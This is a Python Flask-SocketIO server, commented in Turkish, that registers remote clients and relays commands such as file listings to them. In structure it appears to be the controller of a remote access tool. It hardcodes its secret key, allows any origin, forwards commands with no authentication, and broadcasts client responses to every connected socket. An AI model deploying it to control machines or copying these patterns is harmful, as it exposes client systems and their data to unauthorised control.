import os
from flask import Flask, request, render_template, send_from_directory
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json
import logging
import sys

# Detaylı loglama ayarları
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "allow_headers": ["Content-Type", "X-API-Key"],
        "methods": ["GET", "POST", "OPTIONS", "WEBSOCKET"]
    }
})

# WebSocket yapılandırması
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    path='/ws',
    logger=True,
    engineio_logger=True,
    async_mode='eventlet',
    ping_timeout=30,
    ping_interval=15,
    always_connect=True,
    transports=['websocket']
)

# WebSocket route'u
@app.route('/ws')
def websocket_route():
    return "WebSocket endpoint active", 200

# WebSocket hata ayıklama için
@socketio.on_error()
def error_handler(e):
    logger.error(f"WebSocket hatası: {str(e)}")

@socketio.on_error_default
def default_error_handler(e):
    logger.error(f"WebSocket varsayılan hata: {str(e)}")

API_KEY = "K3N4N_P3YS3R_S3CR3T_K3Y"
connected_clients = {}

# Static dosyaları sunmak için
@app.route('/')
def index():
    try:
        logger.info("Ana sayfa isteği alındı")
        if request.headers.get('X-API-Key') != API_KEY:
            return {"error": "Unauthorized"}, 401
        return render_template('dashboard.html')
    except Exception as e:
        logger.error(f"Ana sayfa yüklenirken hata: {str(e)}")
        return str(e), 500

# Template klasörü için özel rota
@app.route('/templates/<path:path>')
def send_template(path):
    try:
        logger.info(f"Template dosyası istendi: {path}")
        return send_from_directory('templates', path)
    except Exception as e:
        logger.error(f"Template dosyası gönderilirken hata: {path}, {str(e)}")
        return str(e), 404

@socketio.on('connect')
def handle_connect():
    try:
        logger.info(f"Yeni WebSocket bağlantısı: {request.sid}")
    except Exception as e:
        logger.error(f"Bağlantı hatası: {str(e)}")

@socketio.on('disconnect')
def handle_disconnect():
    try:
        for client_id, client in list(connected_clients.items()):
            if client.get('socket_id') == request.sid:
                del connected_clients[client_id]
                emit('client_disconnected', {'client_id': client_id}, broadcast=True)
                logger.info(f'Client bağlantısı kesildi: {client_id}')
                break
    except Exception as e:
        logger.error(f"Bağlantı kesme hatası: {str(e)}")

@socketio.on('register')
def handle_register(data):
    try:
        logger.info(f"Register isteği alındı: {data}")
        if data.get('api_key') != API_KEY:
            logger.warning("Geçersiz API anahtarı")
            return
        
        client_id = data.get('client_id')
        if client_id:
            connected_clients[client_id] = {
                'socket_id': request.sid,
                'info': {}
            }
            emit('client_list', {'clients': list(connected_clients.keys())}, broadcast=True)
            logger.info(f'Client kaydedildi: {client_id}')
    except Exception as e:
        logger.error(f"Register hatası: {str(e)}")

@socketio.on('command')
def handle_command(data):
    try:
        logger.info(f"Komut alındı: {data}")
        client_id = data.get('client_id')
        command = data.get('command')
        
        if client_id in connected_clients:
            client_socket_id = connected_clients[client_id]['socket_id']
            
            command_data = {
                'type': 'command',
                'command': command
            }
            
            if command == 'files' and 'path' in data:
                command_data['path'] = data['path']
            
            emit('message', command_data, room=client_socket_id)
            logger.info(f'Komut gönderildi: {client_id} -> {command}')
        else:
            logger.warning(f"Client bulunamadı: {client_id}")
    except Exception as e:
        logger.error(f"Komut hatası: {str(e)}")

@socketio.on('response')
def handle_response(data):
    try:
        logger.info(f"Yanıt alındı: {data}")
        emit('message', data, broadcast=True)
        logger.info(f'Yanıt iletildi: {data.get("command")}')
    except Exception as e:
        logger.error(f"Yanıt hatası: {str(e)}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"Uygulama başlatılıyor - Port: {port}")
    socketio.run(app, host='0.0.0.0', port=port)
